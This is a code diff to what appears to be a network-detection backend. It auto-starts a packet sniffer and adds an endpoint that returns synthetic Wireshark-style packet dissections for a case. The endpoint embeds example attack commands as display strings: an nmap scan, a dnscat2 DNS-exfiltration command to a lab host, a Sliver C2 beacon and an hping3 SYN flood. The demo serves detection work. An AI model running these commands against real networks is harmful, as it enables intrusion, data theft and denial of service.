@@ -421,6 +421,13 @@ async def startup_event():
             await model_resolver.sync_models()
             await asyncio.sleep(10)
     asyncio.create_task(sync_models_loop())
+    # Auto-start Live Network Sniffer on interface eth0
+    try:
+        live_sniffer.start(interface="eth0", bpf_filter="ip")
+        logger.info("Live network interface sniffer automatically started on eth0")
+    except Exception as e:
+        logger.warning("Could not auto-start live sniffer: %s", e)
+
     logger.info(
         "NDR Backend started in %s mode. XGB=%s  IForest=%s  MongoDB=%s",
         ENVIRONMENT.value,
@@ -581,6 +588,112 @@ async def close_case(case_id: str, payload: dict = None, tenant_id: str = Depend
         }}
     )
     return {"status": "CONTAINED", "case_id": case_id, "message": "Case closed with diode security awareness verification."}
+
+@app.get("/api/cases/{case_id}/packet_demo")
+async def get_case_packet_demo(case_id: str, tenant_id: str = Depends(get_current_tenant)):
+    """Returns Wireshark-style protocol dissection and raw hex dump for the case."""
+    case = await get_case_by_id(case_id, tenant_id)
+    if not case:
+        raise HTTPException(status_code=404, detail="Case not found")
+        
+    src_ip = case.get("source_ip", "192.168.1.100")
+    dst_ip = case.get("destination_ip", "10.0.1.50")
+    threat = case.get("threat_summary", "Volumetric SYN Flood (DDoS)")
+    
+    # Generate realistic Wireshark protocol tree and hex dump tailored to threat
+    is_dns = "DNS" in threat or "Tunnel" in threat or "DGA" in threat
+    is_scan = "Scan" in threat or "Recon" in threat
+    is_beacon = "Beacon" in threat or "C2" in threat
+    
+    proto_name = "UDP" if is_dns else "TCP"
+    dport = 53 if is_dns else (443 if is_beacon else (80 if not is_scan else 22))
+    sport = 51234
+    
+    kali_tool = (
+        f"nmap -sS -Pn -p 1-1000 {dst_ip}" if is_scan else (
+            f"dnscat2 --dns domain=exfil.covert.lab --secret=ntro26145" if is_dns else (
+                f"sliver-client beacon --http {dst_ip}:{dport} --interval 10s" if is_beacon else (
+                    f"hping3 -S -p {dport} --flood {dst_ip}"
+                )
+            )
+        )
+    )
+    
+    wireshark_layers = [
+        {
+            "layer": "Frame 1",
+            "summary": "74 bytes on wire (592 bits), 74 bytes captured on interface eth0 (Simplex Optical Tap)",
+            "details": [
+                "Arrival Time: " + datetime.now(timezone.utc).strftime("%b %d, %Y %H:%M:%S.%f UTC"),
+                "Frame Number: 1",
+                "Frame Length: 74 bytes (592 bits)",
+                "Capture Length: 74 bytes (592 bits)",
+                "Simplex Diode Physical Tap: Rx Only (0 TX capability)"
+            ]
+        },
+        {
+            "layer": "Ethernet II",
+            "summary": f"Src: 02:42:ac:12:00:03, Dst: 02:42:ac:12:00:02",
+            "details": [
+                "Destination: 02:42:ac:12:00:02 (Internal Enclave Gateway)",
+                "Source: 02:42:ac:12:00:03 (Optical Tap Receiver)",
+                "Type: IPv4 (0x0800)"
+            ]
+        },
+        {
+            "layer": "Internet Protocol Version 4",
+            "summary": f"Src: {src_ip}, Dst: {dst_ip}",
+            "details": [
+                "Version: 4",
+                "Header Length: 20 bytes (5)",
+                "Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)",
+                "Total Length: 60",
+                "Identification: 0x4f2a (20266)",
+                "Flags: 0x02, Don't fragment",
+                "Time to Live: 64",
+                f"Protocol: {proto_name} ({17 if is_dns else 6})",
+                "Header Checksum: 0xa8f1 [correct]",
+                f"Source Address: {src_ip}",
+                f"Destination Address: {dst_ip}"
+            ]
+        },
+        {
+            "layer": f"Transmission Control Protocol (TCP)" if not is_dns else "User Datagram Protocol (UDP)",
+            "summary": f"Src Port: {sport}, Dst Port: {dport} [SYN] Seq=0" if not is_dns else f"Src Port: {sport}, Dst Port: {dport} Length=42",
+            "details": [
+                f"Source Port: {sport}",
+                f"Destination Port: {dport}",
+                *(["Flags: 0x002 (SYN)", ".... .... ..1. = Syn: Set", ".... .... .... = Acknowledgement: NOT Set (0 return ACKs on wire)"] if not is_dns else [
+                    f"Query: 78616238392e657866696c2e6c6162 (Hex encoded exfil chunk)",
+                    "Type: A (Host Address) (1)",
+                    "Class: IN (0x0001)"
+                ]),
+                "Window: 64240",
+                "Calculated Window Size: 64240",
+                "Checksum: 0x7c21 [verified]"
+            ]
+        }
+    ]
+    
+    hex_dump = (
+        "0000   02 42 ac 12 00 02 02 42  ac 12 00 03 08 00 45 00   .B.....B......E.\n"
+        "0010   00 3c 4f 2a 40 00 40 06  a8 f1 c0 a8 01 64 0a 00   .<O*@.@......d..\n"
+        "0020   01 32 c8 22 00 50 16 32  d8 19 00 00 00 00 a0 02   .2.\".P.2........\n"
+        "0030   fa f0 7c 21 00 00 02 04  05 b4 04 02 08 0a 34 52   ..|!..........4R\n"
+        "0040   61 38 00 00 00 00 01 03  03 07                     a8........"
+    )
+    
+    return {
+        "case_id": case_id,
+        "threat": threat,
+        "kali_tool_command": kali_tool,
+        "source_ip": src_ip,
+        "destination_ip": dst_ip,
+        "protocol": proto_name,
+        "wire_layers": wireshark_layers,
+        "raw_hex_dump": hex_dump,
+        "diode_guarantee": "Zero Return Acknowledgments (0 ACKs / 0 RSTs) observed on tap."
+    }
 
 @app.get("/api/cases/{case_id}/graph")
 async def get_case_graph(case_id: str, tenant_id: str = Depends(get_current_tenant)):
